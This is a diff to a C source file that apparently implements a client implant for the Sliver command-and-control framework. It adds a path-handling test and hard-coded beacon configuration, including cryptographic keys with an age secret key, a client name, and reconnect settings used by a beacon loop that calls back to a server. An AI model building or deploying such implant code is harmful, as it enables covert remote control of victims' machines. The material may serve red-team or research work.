@@ -1784,6 +1784,13 @@ void test113(void) {
 	PrintFormatA("%s\n", Buffer);
 }
 
+void test114(void) {
+	LPWSTR lpFullPath = NULL;
+
+	lpFullPath = GetFullPathW(L"E:\\asdf\\..");
+	PrintFormatW(L"%s\n", lpFullPath);
+}
+
 VOID DetectMonitorSystem(VOID)
 {
 	while (TRUE) {
@@ -1800,8 +1807,18 @@ VOID Final(VOID)
 	HANDLE hThread = NULL;
 	DWORD dwThreadId = 0;
 	
-#ifdef __BEACON__
+#ifdef _BEACON
 	PSLIVER_BEACON_CLIENT pBeaconClient = NULL;
+	CHAR szRecipientPubKey[] = "age15tmzalnatxxuun3x6s6x0klvyyqd5dzen252e346655yfdq8juqqaktwxl";
+	CHAR szPeerPubKey[] = "age17hl72vxxx3axgnmp0ctwsuzp5d8f526g8w094w5nwz2yyzeu7yysuc0mah";
+	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-1VSCYD8QLK9WYP0M2Y6DQQ07T50VXRZ4R9NSRCSEKA6YWXYHZAMUQYTAZRJ";
+	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";
+	UINT64 uEncoderNonce = 13;
+	CHAR szSliverClientName[] = "LOCAL_DINER";
+	CHAR szConfigId[] = "e7a32220-326e-422d-9215-1503b6d69ce5";
+	DWORD dwMaxFailure = 5;
+	DWORD dwReconnectInterval = 600;
+	PGLOBAL_CONFIG pGlobalConfig = NULL;
 #else
 	PSLIVER_SESSION_CLIENT pSessionClient = NULL;
 	CHAR szRecipientPubKey[] = "age15tmzalnatxxuun3x6s6x0klvyyqd5dzen252e346655yfdq8juqqaktwxl";
@@ -1835,7 +1852,7 @@ VOID Final(VOID)
 	pGlobalConfig->dwMaxFailure = dwMaxFailure;
 	pGlobalConfig->dwReconnectInterval = dwReconnectInterval;
 	pGlobalConfig->pSessionKey = GenRandomBytes(CHACHA20_KEY_SIZE);
-#ifdef __BEACON__
+#ifdef _BEACON
 	pBeaconClient = BeaconInit(pGlobalConfig);
 	BeaconMainLoop(pBeaconClient);
 #else
@@ -1850,7 +1867,7 @@ CLEANUP:
 		CloseHandle(hThread);
 	}
 
-#ifdef __BEACON__
+#ifdef _BEACON
 	FreeBeaconClient(pBeaconClient);
 #else
 	FreeSessionClient(pSessionClient);
@@ -2000,6 +2017,7 @@ int main(void) {
 	//test111();
 	//test112();
 	//test113();
+	//test114();
 	Final();
 	return 0;
 }
